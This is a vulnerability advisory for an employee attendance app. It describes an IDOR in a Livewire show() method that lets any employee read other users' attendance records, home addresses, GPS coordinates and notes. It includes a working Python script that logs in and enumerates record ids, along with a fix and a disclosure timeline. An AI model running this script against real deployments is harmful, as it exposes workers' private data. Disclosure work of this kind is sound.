https://github.com/ikhsan3adi/absensi-karyawan-gps-barcode/

# Employee can read any user's attendance record and home address via Livewire show() IDOR

**Affected versions <= master (confirmed on commit 67c69769bc4f9fc399a3f8ddd09e1edcca1694d0)**

### Summary
Any logged-in regular employee can read any other user's attendance record, including an admin's, together with that user's name, employee number (NIP), home address, GPS coordinates and note. The Livewire component behind /attendance-history exposes a public method `show($attendanceId)` that does `Attendance::find($attendanceId)` with no ownership check, while the list the component renders is scoped to the current user.

### Details
`app/Livewire/Traits/AttendanceDetailTrait.php` (used by `App\Livewire\AttendanceHistoryComponent`):

```php
public function show($attendanceId)
{
    $attendance = Attendance::find($attendanceId);
    if ($attendance) {
        $this->showDetail = true;
        $this->currentAttendance = $attendance->getAttributes();
        $this->currentAttendance['name'] = $attendance->user->name;
        $this->currentAttendance['nip'] = $attendance->user->nip;
        $this->currentAttendance['address'] = $attendance->user->address;
        ...
```

`render()` builds the visible list with `Attendance::filter(month: ..., userId: $user->id)`, so an employee is only shown their own rows, but Livewire lets the client call any public method with any argument. The `Attendance` model has no global scope, there is no policy/gate, and the `user` route middleware only checks that the caller is a non-admin. The admin pages (`/admin/attendances`) are guarded by the `admin` middleware, so seeing other employees' attendance is an admin-only capability by design. Attendance ids are sequential integers, so every record can be enumerated.

### Steps To Reproduce (own local instance, throwaway accounts)
Tested at commit 67c69769bc4f9fc399a3f8ddd09e1edcca1694d0 (master, 2026-11-14). Setup deviations: SQLite instead of MySQL, `SESSION_DRIVER=file`, `QUEUE_CONNECTION=sync`, frontend built with `npm run build`, served by `php artisan serve` in a php:8.3-cli container. Users created via tinker with my own password: alice (group user), bob (group user), carol (group admin). Attendance id 1 = bob, 2 = carol, 3 = alice.

```python
import re,json,html,requests
B='http://127.0.0.1:18078'
s=requests.Session()
r=s.get(B+'/login'); t=re.search(r'name="_token" value="([^"]+)"',r.text).group(1)
s.post(B+'/login',data={'_token':t,'email':'alice@r78.test','password':'<alice password>'})
r=s.get(B+'/attendance-history')
tok=re.search(r'<meta name="csrf-token" content="([^"]+)"',r.text).group(1)
snaps=[html.unescape(x) for x in re.findall(r'wire:snapshot="([^"]+)"',r.text)]
snap=[x for x in snaps if 'attendance' in json.loads(x)['memo']['name']][0]
def show(i):
    p={'_token':tok,'components':[{'snapshot':snap,'updates':{},'calls':[{'path':'','method':'show','params':[i]}]}]}
    r=s.post(B+'/livewire/update',json=p,headers={'X-CSRF-TOKEN':tok,'X-Livewire':'true'})
    return json.loads(r.json()['components'][0]['snapshot'])['data']
for i in range(1,7): print(i, show(i))
```

Result as alice (regular employee):
- show(1): showDetail true, bob's record: date, time_in/out, latitude 1.2345, longitude 103.1234, note "BOB-PRIVATE-NOTE", name "EmpBob", nip, address "EmpBob private home address 12".
- show(2): the admin's record and name, nip, address ("Carol admin address").
- show(3): alice's own record (control).
- show(4..6): showDetail false, empty (nonexistent ids, control).
- Control: alice gets 403 on /admin/attendances, carol gets 200. An unauthenticated request with alice's snapshot gets 401. A request without the CSRF token gets 419.
- A fresh verifier re-ran every call, also as bob (show(2), show(3) returned carol's and alice's records), and also saw the data in the re-rendered modal HTML (`effects.html`).

Fuzz/enumeration: ids 1..6 enumerated as above; the only variable is the integer id.

### Impact
A low-privilege employee account can enumerate and read every attendance record in the deployment, including admin accounts' records, and obtain colleagues' names, employee numbers, home addresses, GPS locations and notes. Writes were not demonstrated. Not demonstrated: the attachment, barcode and shift branches of the modal (the test rows had none).

Suggested fix: in `show()`, load via the owner-scoped query (`Attendance::where('user_id', auth()->id())->find($id)`) unless the caller is an admin.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (4.3, Medium)
CWE-639: Authorization Bypass Through User-Controlled Key


## Disclosure
 - 16 Nov 2026 - opened https://github.com/ikhsan3adi/absensi-karyawan-gps-barcode/security/advisories/GHSA-mx6q-2fmq-gjxh
 - 16 Nov 2026 - closed without comments/reason
